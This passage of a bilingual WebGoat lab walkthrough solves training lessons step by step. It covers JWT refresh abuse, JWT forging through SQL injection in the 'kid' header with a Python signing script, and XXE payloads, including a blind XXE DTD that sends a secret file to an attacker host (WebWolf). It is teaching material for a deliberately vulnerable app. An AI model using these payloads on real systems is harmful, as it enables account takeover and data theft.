		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/497947799/jwt-5.png" alt="JWT 5" class="img-responsive atto_image_button_text-bottom" width="800" height="77">
		<div><br></div>
		7.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/523703559/warning.png" alt="Warning" class="img-responsive atto_image_button_text-bottom" width="24" height="24"> 
		<span class="multilang" lang="fr">
		Ce challenge ne donne pas assez d'informations pour être résolu. 
		En fouillant dans le code source, on se rend compte qu'il faut faire une requête <code>POST</code> vers 
		http://host:port/WebGoat/JWT/refresh/login, ayant pour en-tête <code>Content-Type: application/json</code> 
		et pour corps <code>{"user":"Jerry","password":"bm5nhSkxCXZkKRy4"}</code> pour récupérer le token d'actualisation de Jerry.
		</span>
		<span class="multilang" lang="en">
		This challenge doesn't provide enough information to be completed. 
		By looking into the source code, we can find the following has to be done:
		Make a <code>POST</code> request to http://host:port/WebGoat/JWT/refresh/login with header <code>Content-Type: application/json</code> 
		and content <code>{"user":"Jerry","password":"bm5nhSkxCXZkKRy4"}</code> to obtain a <code>&lt;jerry_refresh_token&gt;</code>.
		</span>
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/523703559/warning.png" alt="Warning" class="img-responsive atto_image_button_text-bottom" width="24" height="24"> 
		<span class="multilang" lang="fr">
		Le numéro de leçon ne devient pas vert après validation.
		</span>
		<span class="multilang" lang="en">
		Lesson number does not turn green on validation..
		</span>
		<div><br></div>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Look at the access log you will find a token there 
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		The token from the access log is no longer valid, can you find a way to refresh it? 
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		The endpoint for refreshing a token is 'jwt/refresh/newToken' 
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Use the found access token in the Authorization: Bearer header and use your own refresh token
		<div><br></div>
		<ul>
			<li>
				<span class="multilang" lang="fr">
					Récupérer le token d'accès de Tom dans les <b>logs</b>.
				</span>
				<span class="multilang" lang="en">
					Find the <code>&lt;tom_access_token&gt;</code> from the logs.				
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Faire une requête <code>POST</code> vers http://host:port/WebGoat/JWT/refresh/newToken , 
					ayant pour en-tête <code>Content-Type: application/json</code> 
					et <code>Authorization: Bearer &lt;tom_access_token&gt;</code> 
					et pour corps <code>{"refresh_token":"&lt;jerry_refresh_token&gt;"}</code>
				</span>
				<span class="multilang" lang="en">
					Make a <code>POST</code> request to http://host:port/WebGoat/JWT/refresh/newToken
					with header <code>Content-Type: application/json</code> 
					and <code>Authorization: Bearer &lt;tom_access_token&gt;</code> 
					and content <code>{"refresh_token":"&lt;jerry_refresh_token&gt;"}</code>
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Récupérer le nouveau token d'accès de Tom.
				</span>
				<span class="multilang" lang="en">
					Get the <code>&lt;tom_access_token_new&gt;</code>.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Intercepter la requête vers http://host:port/WebGoat/JWT/refresh/checkout 
					et ajouter l'en-tête <code>Authorization: Bearer &lt;tom_new_access_token&gt;</code>.
				</span>
				<span class="multilang" lang="en">
					Intercept the POST request to http://host:port/WebGoat/JWT/refresh/checkout 
					and add header <code>Authorization: Bearer &lt;tom_access_token_new&gt;</code>
				</span>
			</li>
		</ul>
		<div><br></div>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/374925402/jwt-7-1.png" alt="JWT 7" class="img-responsive atto_image_button_text-bottom" width="800" height="342">
		<div><br></div>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/168419209/jwt-7-2.png" alt="JWT 7" class="img-responsive atto_image_button_text-bottom" width="800" height="327">
		<div><br></div>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/304222411/jwt-7-3.png" alt="JWT 7" class="img-responsive atto_image_button_text-bottom" width="800" height="328">
		<div><br></div>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/241558730/jwt-7-4.png" alt="JWT 7" class="img-responsive atto_image_button_text-bottom" width="800" height="327">
		<div><br></div>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/922229158/jwt-7-5.png" alt="JWT 7" class="img-responsive atto_image_button_text-bottom" width="800" height="326">
		<div><br></div>
		8.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/523703559/warning.png" alt="Warning" class="img-responsive atto_image_button_text-bottom" width="24" height="24"> 
		<span class="multilang" lang="fr">
		Il manque une précision dans les indices, la clé est décodée comme une chaine en base64, 
		aussi au lieu d'utiliser comme <b>kid</b> <code>hacked' UNION select 'deletingTom' from INFORMATION_SCHEMA.SYSTEM_USERS --</code>,
		il faut utiliser <code>hacked' UNION select 'ZGVsZXRpbmdUb20=' from INFORMATION_SCHEMA.SYSTEM_USERS --</code>
		</span>
		<span class="multilang" lang="en">
		It lacks a precision in the hints: the key is decoded as a base64 chain. 
		Also instead of using as <b>kid</b> <code>hacked' UNION select 'deletingTom' from INFORMATION_SCHEMA.SYSTEM_USERS --</code>,
		you have to use <code>hacked' UNION select 'ZGVsZXRpbmdUb20=' from INFORMATION_SCHEMA.SYSTEM_USERS --</code>
		</span>
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/523703559/warning.png" alt="Warning" class="img-responsive atto_image_button_text-bottom" width="24" height="24"> 
		<span class="multilang" lang="fr">
		Le numéro de leçon ne devient pas vert après validation.
		</span>
		<span class="multilang" lang="en">
		Lesson number does not turn green on validation..
		</span>
		<div><br></div>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Take a look at the token and specifically and the header 
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		The 'kid' (key ID) header parameter is a hint indicating which key was used to secure the JWS
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		The key can be located on the filesystem in memory or even reside in the database
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		The key is stored in the database and loaded while verifying a token
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Using a SQL injection you might be able to manipulate the key to something you know and create a new token.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Use: hacked' UNION select 'deletingTom' from INFORMATION_SCHEMA.SYSTEM_USERS -- as the kid in the header and change the contents of the token to Tom and hit the endpoint with the new token
		<div><br></div>
		<ul>
			<li>
				<span class="multilang" lang="fr">
					Ouvrir les <i>Outils de développements</i> du navigateur, et aller dans l'onglet <i>Réseau</i>.
				</span>
				<span class="multilang" lang="en">
					Open the <i>Development Tools</i> in the browser, and go to the <i>Network</i> tab. 
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Sur WebGoat, cliquer sur <b>Delete</b>.
				</span>
				<span class="multilang" lang="en">
					On WebGoat, click on <b>Delete</b>.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Repérer la requête vers <code>delete</code> dans l'onglet <i>Réseau</i> et cliquer sur <i>En-têtes</i>.
				</span>
				<span class="multilang" lang="en">
					Locate the query to <code>delete</code> in the <i>Network</i> tab and click on <i>Headers</i>.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Remarquer le paramètre <code>token=eyJ0eXAiOiJKV1QiLCJraWQiOiJ3ZWJnb2F0X2tleSIsImFsZyI6IkhTMjU2In0.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsInVzZXJuYW1lIjoiSmVycnkiLCJFbWFpbCI6ImplcnJ5QHdlYmdvYXQuY29tIiwiUm9sZSI6WyJDYXQiXX0.CgZ27DzgVW8gzc0n6izOU638uUCi6UhiOJKYzoEZGE8</code>.
				</span>
				<span class="multilang" lang="en">
					Notice the <code>token=eyJ0eXAiOiJKV1QiLCJraWQiOiJ3ZWJnb2F0X2tleSIsImFsZyI6IkhTMjU2In0.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsInVzZXJuYW1lIjoiSmVycnkiLCJFbWFpbCI6ImplcnJ5QHdlYmdvYXQuY29tIiwiUm9sZSI6WyJDYXQiXX0.CgZ27DzgVW8gzc0n6izOU638uUCi6UhiOJKYzoEZGE8</code>.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					En base64, cela se décode en : 
					<code>{"typ":"JWT","kid":"webgoat_key","alg":"HS256"}.{"iss":"WebGoat Token Builder","iat":1524210904,"exp":1618905304,"aud":"webgoat.org","sub":"jerry@webgoat.com","username":"Jerry","Email":"jerry@webgoat.com","Role":["Cat"]}.signature</code>.
				</span>
				<span class="multilang" lang="en">
					In base64, this is decoded as: 
					<code>{"typ":"JWT","kid":"webgoat_key","alg":"HS256"}.{"iss":"WebGoat Token Builder","iat":1524210904,"exp":1618905304,"aud":"webgoat.org","sub":"jerry@webgoat.com","username":"Jerry","Email":"jerry@webgoat.com","Role":["Cat"]}.signature</code>.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Modifier les deux premières parties du token en 
					<code>{"typ":"JWT","kid":"hacked' UNION select 'ZGVsZXRpbmdUb20=' from INFORMATION_SCHEMA.SYSTEM_USERS --","alg":"HS256"}</code> et <code>{"iss":"WebGoat Token Builder","iat":1524210904,"exp":1618905304,"aud":"webgoat.org","sub":"jerry@webgoat.com","username":"Tom","Email":"jerry@webgoat.com","Role":["Cat"]}</code>,
					puis recalculer la signature avec la clé <code>deletingTom</code>, avec le script Python ci-dessous par exemple.
				</span>
				<span class="multilang" lang="en">
					Edit the first two parts of the token as 
					<code>{"typ":"JWT","kid":"hacked' UNION select 'ZGVsZXRpbmdUb20=' from INFORMATION_SCHEMA.SYSTEM_USERS --","alg":"HS256"}</code> et <code>{"iss":"WebGoat Token Builder","iat":1524210904,"exp":1618905304,"aud":"webgoat.org","sub":"jerry@webgoat.com","username":"Tom","Email":"jerry@webgoat.com","Role":["Cat"]}</code>,
					then calculate the new signature with <code>deletingTom</code> as the new key. Use the Python script below for example.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Le nouveau token est <code>eyJ0eXAiOiJKV1QiLCJraWQiOiJoYWNrZWQnIFVOSU9OIHNlbGVjdCAnWkdWc1pYUnBibWRVYjIwPScgZnJvbSBJTkZPUk1BVElPTl9TQ0hFTUEuU1lTVEVNX1VTRVJTIC0tIiwiYWxnIjoiSFMyNTYifQ.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsInVzZXJuYW1lIjoiVG9tIiwiRW1haWwiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsIlJvbGUiOlsiQ2F0Il19.JrDpQmNiVI818UvOMQgRmPkZOetw7Ic1WbPvStS2B6U</code>.
				</span>
				<span class="multilang" lang="en">
					The new token is <code>eyJ0eXAiOiJKV1QiLCJraWQiOiJoYWNrZWQnIFVOSU9OIHNlbGVjdCAnWkdWc1pYUnBibWRVYjIwPScgZnJvbSBJTkZPUk1BVElPTl9TQ0hFTUEuU1lTVEVNX1VTRVJTIC0tIiwiYWxnIjoiSFMyNTYifQ.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsInVzZXJuYW1lIjoiVG9tIiwiRW1haWwiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsIlJvbGUiOlsiQ2F0Il19.JrDpQmNiVI818UvOMQgRmPkZOetw7Ic1WbPvStS2B6U</code>.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Cliquer sur <i>Modifier et Renvoyer</i>, modifier le paramètre avec la nouvelle valeur générée, et renvoyer la requête.
				</span>
				<span class="multilang" lang="en">
					Click on <i>Modify and Resend</i>, modify the token with the newly generated parameter and send again the request.
				</span>
			</li>
		</ul>
		<code>
		import base64
		<br>
		import hashlib
		<br>
		import hmac
		<br>
		<br>
		def jwt_tokens_8():
		<br>
		&nbsp;&nbsp;&nbsp;&nbsp; def hmac_base64(key, message):
		<br>
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return base64.urlsafe_b64encode(bytes.fromhex(hmac.new(key, message, hashlib.sha256).hexdigest()))
		<br>
		<br>
		&nbsp;&nbsp;&nbsp;&nbsp; header = '{"typ":"JWT","kid":"hacked\' UNION select \'ZGVsZXRpbmdUb20=\' from INFORMATION_SCHEMA.SYSTEM_USERS --","alg":"HS256"}'.encode()
		<br>
		&nbsp;&nbsp;&nbsp;&nbsp; payload = '{"iss":"WebGoat Token Builder","iat":1524210904,"exp":1618905304,"aud":"webgoat.org","sub":"jerry@webgoat.com","username":"Tom","Email":"jerry@webgoat.com","Role":["Cat"]}'.encode()
		<br>
		<br>
		&nbsp;&nbsp;&nbsp;&nbsp; new_token = (base64.urlsafe_b64encode(header).decode().rstrip('=') + 
		<br>
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; '.' + 
		<br>
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; base64.urlsafe_b64encode(payload).decode().rstrip('=')).encode()
		<br>
		&nbsp;&nbsp;&nbsp;&nbsp; new_signature = hmac_base64('deletingTom'.encode(), new_token)
		<br>
		&nbsp;&nbsp;&nbsp;&nbsp; new_token += ('.' + new_signature.decode().rstrip('=')).encode()
		<br>
		<br>
		&nbsp;&nbsp;&nbsp;&nbsp; print('New token: {}'.format(new_token.decode()))
		<br>
		&nbsp;&nbsp;&nbsp;&nbsp; return
		<br>
		<br>
		jwt_tokens_8()
		</code>
	</div>
</div>

<div><br></div>
<div><br></div>

<div>
	<h4><u><b>(A3) Sensitive Data Exposure:</b></u></h4>
	<div>
		<div><br></div>
		<h5>Insecure Login</h5>
		<div><br></div>
		2.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/523703559/warning.png" alt="Warning" class="img-responsive atto_image_button_text-bottom" width="24" height="24"> 
		<span class="multilang" lang="fr">
		Le numéro de leçon ne devient pas vert après validation.
		</span>
		<span class="multilang" lang="en">
		Lesson number does not turn green on validation..
		</span>
		<div><br></div>
		<ul>
			<li>
				<span class="multilang" lang="fr">
					Ouvrir les <i>Outils de développements</i> du navigateur, et aller dans l'onglet <i>Réseau</i>.
				</span>
				<span class="multilang" lang="en">
					Open the <i>Development Tools</i> in the browser, and go to the <i>Network</i> tab. 
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Sur WebGoat, cliquer sur <b>Log in</b>.
				</span>
				<span class="multilang" lang="en">
					On WebGoat, click on <b>Log in</b>.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Repérer la requête vers <code>start.mvc</code> dans l'onglet <i>Réseau</i> et cliquer sur <i>Paramètres</i>.
				</span>
				<span class="multilang" lang="en">
					Locate the query to <code>start.mc</code> in the <i>Network</i> tab and click on <i>Parameters</i>.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Remarquer les paramètres <code>{"username":"CaptainJack","password":"BlackPearl"}</code>.
				</span>
				<span class="multilang" lang="en">
					Notice the parameters <code>{"username":"CaptainJack","password":"BlackPearl"}</code>.
				</span>
			</li>
		</ul>
	</div>
</div>
<div><br></div>
<div><br></div>

<div>
	<h4><u><b>(A4) XML External Entities (XXE):</b></u></h4>
	<div><br></div>
	<h5>XXE</h5>
	<div><br></div>
	3.
	<br>
	<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
	Try submitting the form and see what happens 
	<br>
	<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
	Use ZAP/Burp to intercept the request and try to include your own DTD
	<br>
	<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
	Try to include a doctype "(&lt;!DOCTYPE...)" in the xml
	<br>
	<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
	The include can be as follows: &lt;!DOCTYPE user [&lt;!ENTITY root SYSTEM "file:///"&gt; ]&gt;
	<br>
	<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
	Do not forget to reference the entity 
	<br>
	<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
	In the comment you should references: &lt;comment&gt;&lt;text&gt;&root;test&lt;/text&gt;&lt;/comment&gt;
	<div><br></div>
	<ul>
		<li>
			<span class="multilang" lang="fr">
				Ouvrir les <i>Outils de développements</i> du navigateur, et aller dans l'onglet <i>Réseau</i>.
			</span>
			<span class="multilang" lang="en">
				Open the <i>Development Tools</i> in the browser, and go to the <i>Network</i> tab. 
			</span>
		</li>
		<li>
			<span class="multilang" lang="fr">
				Sur WebGoat, poster un commentaire.
			</span>
			<span class="multilang" lang="en">
				On WebGoat, post a comment.
			</span>
		</li>
		<li>
			<span class="multilang" lang="fr">
				Repérer la requête vers <code>simple</code> dans l'onglet <i>Réseau</i> et cliquer sur <i>Modifier et renvoyer</i>.
			</span>
			<span class="multilang" lang="en">
				Locate the query to <code>simple</code> in the <i>Network</i> tab and click on <i>Edit and Resend</i>.
			</span>
		</li>
		<li>
			<span class="multilang" lang="fr">
			Modifier le corps de la requête en :
			<code>&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE comment [&lt;!ENTITY xxe SYSTEM "file:///"&gt;]>&lt;comment&gt;&lt;text&gt;&amp;xxe;&lt;/text&gt;&lt;/comment&gt;</code>.
			</span>
			<span class="multilang" lang="en">
			Edit the body with:
			<code>&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE comment [&lt;!ENTITY xxe SYSTEM "file:///"&gt;]>&lt;comment&gt;&lt;text&gt;&amp;xxe;&lt;/text&gt;&lt;/comment&gt;</code>.
			</span>
		</li>
	</ul>
	<div><br></div>
	<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/349327222/xxe-3.png" alt="XXE 3" class="img-responsive atto_image_button_text-bottom" width="800" height="325">Introduction:</b>
	<div><br></div>
	4.
	<br>
	<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
	Take a look at the content type
	<br>
	<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
	Does the endpoint only accept json messages?
	<div><br></div>
	<ul>
		<li>
			<span class="multilang" lang="fr">
				Ouvrir les <i>Outils de développements</i> du navigateur, et aller dans l'onglet <i>Réseau</i>.
			</span>
			<span class="multilang" lang="en">
				Open the <i>Development Tools</i> in the browser, and go to the <i>Network</i> tab. 
			</span>
		</li>
		<li>
			<span class="multilang" lang="fr">
				Sur WebGoat, poster un commentaire.
			</span>
			<span class="multilang" lang="en">
				On WebGoat, post a comment.
			</span>
		</li>
		<li>
			<span class="multilang" lang="fr">
				Repérer la requête vers <code>content-type</code> dans l'onglet <i>Réseau</i> et cliquer sur <i>Modifier et renvoyer</i>.
			</span>
			<span class="multilang" lang="en">
				Locate the query to <code>content-type</code> in the <i>Network</i> tab and click on <i>Edit and Resend</i>.
			</span>
		</li>
		<li>
			<span class="multilang" lang="fr">
			Modifier le corps de la requête en :
			<code>&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE comment [&lt;!ENTITY xxe SYSTEM "file:///"&gt;]>&lt;comment&gt;&lt;text&gt;&amp;xxe;&lt;/text&gt;&lt;/comment&gt;</code>,
			et modifier l'en-tête <code>Content-Type: application/json</code> en <code>Content-Type: application/xml</code>.
			</span>
			<span class="multilang" lang="en">
			Edit the body with:
			<code>&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE comment [&lt;!ENTITY xxe SYSTEM "file:///"&gt;]>&lt;comment&gt;&lt;text&gt;&amp;xxe;&lt;/text&gt;&lt;/comment&gt;</code>.
			and edit the header <code>Content-Type: application/json</code> with <code>Content-Type: application/xml</code>.
			</span>
		</li>
	</ul>
	<div><br></div>
	<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/760284545/xxe-4.png" alt="XXE 4" class="img-responsive atto_image_button_text-bottom" width="800" height="326">
	<div><br></div>
	<span class="multilang" lang="fr">
		6. Même si ce n'est pas un challenge, une petite erreur s'est glissée dans la leçon, faire attention à rentrer les bonnes URL pour pouvoir effectuer le test.
	</span>
	<span class="multilang" lang="en">
		6. Although it is not a challenge, a small mistake has crept into the lesson, be careful to enter the right URL to be able to perform the test.
	</span>
	<br>
	<br>
	<b>attack.dtd</b>
	<br>
	<code>
		&lt;?xml version="1.0" encoding="UTF-8"?&gt;
		<br>
		&lt;!ENTITY ping SYSTEM 'http://host:port/landing?test=HelloWorld' &gt;
	</code>
	<br>
	<br>
	<b>Request Body</b>
	<br>
	<code>
		&lt;?xml version="1.0"?&gt;
		<br>
		&lt;!DOCTYPE root [
		<br>
		&lt;!ENTITY % remote SYSTEM "http://host:port/files/username/attack.dtd" &gt;
		<br>
		%remote;
		<br>
		]&gt;
		<br>
		&lt;comment&gt;
		<br>
		&lt;text>test&amp;ping;&lt;/text&gt;
		<br>
		&lt;/comment&gt;
		<br>
	</code>
	<div><br></div>
	7.
	<br>
	<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
	This assignment is more complicated you need to upload the contents of a file to the attackers site (WebWolf in this case)
	<br>
	<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
	In this case you cannot combine external entities in combination with internal entities.
	<br>
	<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
	Use parameter entities to perform the attack, see for example: https://www.acunetix.com/blog/articles/xml-external-entity-xxe-limitations/
	<br>
	<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
	An example DTD can be found here WebGoat/images/example.dtd, include this DTD in the xml comment
	<br>
	<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
	Use for the comment, be aware to replace the url accordingly: &lt;?xml version="1.0"?>&lt;!DOCTYPE comment [&lt;!ENTITY % remote SYSTEM "http://localhost:9090/files/test1234/test.dtd"&gt;%remote;]&gt;&lt;comment&gt;&lt;text&gt;test&send;&lt;/text&gt;&lt;/comment&gt;
	<div><br></div>
	<ul>
		<li>
			<span class="multilang" lang="fr">
				Envoyer le fichier <b>contents_file.dtd</b> vers <b>WebWolf</b>.
			</span>
			<span class="multilang" lang="en">
				Upload <b>contents_file.dtd</b> on <b>WebWolf</b>. 
			</span>
		</li>
		<li>
			<span class="multilang" lang="fr">
				Ouvrir les <i>Outils de développements</i> du navigateur, et aller dans l'onglet <i>Réseau</i>.
			</span>
			<span class="multilang" lang="en">
				Open the <i>Development Tools</i> in the browser, and go to the <i>Network</i> tab. 
			</span>
		</li>
		<li>
			<span class="multilang" lang="fr">
				Sur WebGoat, poster un commentaire.
			</span>
			<span class="multilang" lang="en">
				On WebGoat, post a comment.
			</span>
		</li>
		<li>
			<span class="multilang" lang="fr">
				Repérer la requête vers <code>blind</code> dans l'onglet <i>Réseau</i> et cliquer sur <i>Modifier et renvoyer</i>.
			</span>
			<span class="multilang" lang="en">
				Locate the query to <code>blind</code> in the <i>Network</i> tab and click on <i>Edit and Resend</i>.
			</span>
		</li>
		<li>
			<span class="multilang" lang="fr">
			Modifier le corps de la requête comme spécifié ci-dessous.
			</span>
			<span class="multilang" lang="en">
			Edit the body of the query as specified below.
			</span>
		</li>
	</ul>
	<div><br></div>
	<b>contents_file.dtd</b>
	<br>
	<code>
		&lt;?xml version="1.0" encoding="UTF-8"?&gt;
		<br>
		&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://host:port/landing?%file;' &gt;" &gt;%all;
	</code>
	<br>
	<br>
	<b>Request Body</b>
	<br>
	<code>
		&lt;?xml version="1.0" encoding="UTF-8"?&gt;
		<br>
		&lt;!DOCTYPE xxe [
		<br>
		&lt;!ENTITY % file SYSTEM "file:///home/webgoat/.webgoat-8.0.0.M25/XXE/secret.txt" &gt;
		<br>
		&lt;!ENTITY % dtd SYSTEM "http://host:port/files/username/contents_file.dtd" &gt;
		<br>
		%dtd;]&gt;
		<br>
		&lt;comment&gt;
		<br>
		&lt;text&gt;test&amp;send;&lt;/text&gt;
		<br>
		&lt;/comment&gt;
	</code>
	<div><br></div>
	<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/187271841/xxe-7.png" alt="XXE 7" class="img-responsive atto_image_button_text-bottom" width="800" height="364">
</div>

<div><br></div>
<div><br></div>

<div>
	<h4><u><b>(A5) Broken Access Control:</b></u></h4>
	<div>
		<div><br></div>
		<h5>Insecure Direct Object References</h5>
		<div><br></div>
		2.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Log in first. User Name is tom, password is cat.
		<div><br></div>
		<span class="multilang" lang="fr">
			S'indentifier avec les identifiants fournis.
		</span>
		<span class="multilang" lang="en">
			Identify with the provided credentials.
		</span>
		<div><br></div>
		3.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/523703559/warning.png" alt="Warning" class="img-responsive atto_image_button_text-bottom" width="24" height="24"> 
		<span class="multilang" lang="fr">
		Le numéro de leçon ne devient pas vert après validation.
		</span>
		<span class="multilang" lang="en">
		Lesson number does not turn green on validation.
		</span>
		<div><br></div>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Make sure you have logged in on the previous step/page
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		View the response using developer tools or a proxy.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		The attributes are not visible and have nothing to do with size, color or name
		<div><br></div>
		<span class="multilang" lang="fr">
			Les attributs attendus sont : <b>role</b>, <b>userID</b>.
		</span>
		<span class="multilang" lang="en">
			Attributes are: <b>role</b>, <b>userID</b>.
		</span>
		<div><br></div>
		4.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Look at the previous request for profile, this is similar
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		You will need data from the previous request for your own profile
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Append your id to the previous request (i.e. .../profile/{yourId})
		<div><br></div>
		<ul>
			<li>
				<span class="multilang" lang="fr">
					Ouvrir les <i>Outils de développements</i> du navigateur, et aller dans l'onglet <i>Réseau</i>.
				</span>
				<span class="multilang" lang="en">
					Open the <i>Development Tools</i> in the browser, and go to the <i>Network</i> tab. 
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Dans la leçon 3, cliquer sur <b>View Profile</b>.
